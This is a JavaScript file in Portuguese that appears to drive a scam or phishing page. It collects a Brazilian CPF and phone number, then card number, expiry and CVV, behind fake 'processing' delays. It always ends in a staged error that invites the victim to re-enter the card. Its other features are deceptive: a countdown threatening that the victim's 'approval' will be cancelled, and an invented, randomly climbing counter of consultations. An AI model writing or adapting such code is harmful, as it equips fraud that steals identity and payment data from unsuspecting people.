document.addEventListener('DOMContentLoaded', function() {
    // Formulário de Consulta
    const formConsulta = document.getElementById('formConsulta');
    if (formConsulta) {
        formConsulta.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Validação básica dos campos
            const cpf = document.getElementById('cpf').value;
            const telefone = document.getElementById('telefone').value;
            
            if (!validarCPF(cpf)) {
                alert('Por favor, insira um CPF válido.');
                return;
            }
            
            if (!validarTelefone(telefone)) {
                alert('Por favor, insira um telefone válido.');
                return;
            }
            
            // Mostrar mensagem de loading
            document.getElementById('mensagem-loading').style.display = 'block';
            formConsulta.style.display = 'none';
            
            // Simular processamento
            setTimeout(function() {
                window.location.href = 'confirmacao.html';
            }, 3000);
        });
    }
    
    // Formulário Final
    const formFinalizacao = document.getElementById('formFinalizacao');
    if (formFinalizacao) {
        formFinalizacao.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Validação dos campos bancários
            if (!validarDadosBancarios()) {
                return;
            }
            
            // Mostrar mensagem de loading
            document.getElementById('mensagem-final').style.display = 'block';
            formFinalizacao.style.display = 'none';
            
            // Simular processamento
            setTimeout(function() {
                alert('Erro no processamento. Por favor, tente novamente mais tarde.');
                document.getElementById('mensagem-final').style.display = 'none';
                formFinalizacao.style.display = 'block';
            }, 5000);
        });
    }
    
    // Máscaras para campos
    aplicarMascaraCPF();
    aplicarMascaraTelefone();
    aplicarMascaraCartao();
    aplicarMascaraValidade();
    
    // Contador regressivo na página de confirmação
    iniciarContadorRegressivo();
    
    // Simular contador de consultas
    iniciarContadorConsultas();
});

// Funções de validação
function validarCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g,'');
    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
    
    // Validação dos dígitos verificadores
    let soma = 0;
    for (let i = 0; i < 9; i++) {
        soma += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let resto = 11 - (soma % 11);
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.charAt(9))) return false;
    
    soma = 0;
    for (let i = 0; i < 10; i++) {
        soma += parseInt(cpf.charAt(i)) * (11 - i);
    }
    resto = 11 - (soma % 11);
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.charAt(10))) return false;
    
    return true;
}

function validarTelefone(telefone) {
    const numeros = telefone.replace(/\D/g, '');
    return numeros.length >= 10 && numeros.length <= 11;
}

function validarDadosBancarios() {
    const cartao = document.getElementById('cartao').value.replace(/\s/g, '');
    const validade = document.getElementById('validade').value;
    const cvv = document.getElementById('cvv').value;
    
    if (cartao.length < 16) {
        alert('Número do cartão inválido. Deve conter 16 dígitos.');
        return false;
    }
    
    if (!/^\d{2}\/\d{2}$/.test(validade)) {
        alert('Data de validade inválida. Use o formato MM/AA.');
        return false;
    }
    
    if (!/^\d{3,4}$/.test(cvv)) {
        alert('CVV inválido. Deve conter 3 ou 4 dígitos.');
        return false;
    }
    
    return true;
}

// Funções de máscara
function aplicarMascaraCPF() {
    const cpfInput = document.getElementById('cpf');
    if (cpfInput) {
        cpfInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.substring(0, 11);
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            e.target.value = value;
        });
    }
}

function aplicarMascaraTelefone() {
    const telefoneInput = document.getElementById('telefone');
    if (telefoneInput) {
        telefoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.substring(0, 11);
            value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
            value = value.replace(/(\d)(\d{4})$/, '$1-$2');
            e.target.value = value;
        });
    }
}

function aplicarMascaraCartao() {
    const cartaoInput = document.getElementById('cartao');
    if (cartaoInput) {
        cartaoInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.substring(0, 16);
            value = value.replace(/(\d{4})(\d)/, '$1 $2');
            value = value.replace(/(\d{4})(\d)/, '$1 $2');
            value = value.replace(/(\d{4})(\d)/, '$1 $2');
            e.target.value = value.trim();
        });
    }
}

function aplicarMascaraValidade() {
    const validadeInput = document.getElementById('validade');
    if (validadeInput) {
        validadeInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.substring(0, 4);
            if (value.length > 2) {
                value = value.replace(/^(\d{2})(\d)/, '$1/$2');
            }
            e.target.value = value;
        });
    }
}

// Funções de contadores
function iniciarContadorRegressivo() {
    const mensagemUrgente = document.querySelector('.urgente');
    if (mensagemUrgente && mensagemUrgente.textContent.includes('minutos')) {
        let minutos = 15;
        const intervalo = setInterval(function() {
            minutos--;
            const mensagem = `⚠️ <strong>Atenção:</strong> Você tem apenas <strong>${minutos} ${minutos === 1 ? 'minuto' : 'minutos'}</strong> para completar esta etapa. Após esse prazo, sua aprovação será cancelada.`;
            mensagemUrgente.innerHTML = mensagem;
            
            if (minutos <= 0) {
                clearInterval(intervalo);
                mensagemUrgente.innerHTML = '⏰ Seu tempo expirou. Por favor, recomece o processo.';
            }
        }, 60000);
    }
}

function iniciarContadorConsultas() {
    const contadorElement = document.querySelector('.contador strong');
    if (contadorElement) {
        let contador = 6429871;
        setInterval(function() {
            contador += Math.floor(Math.random() * 10) + 1;
            contadorElement.textContent = contador.toLocaleString('pt-BR');
        }, 3000);
    }
}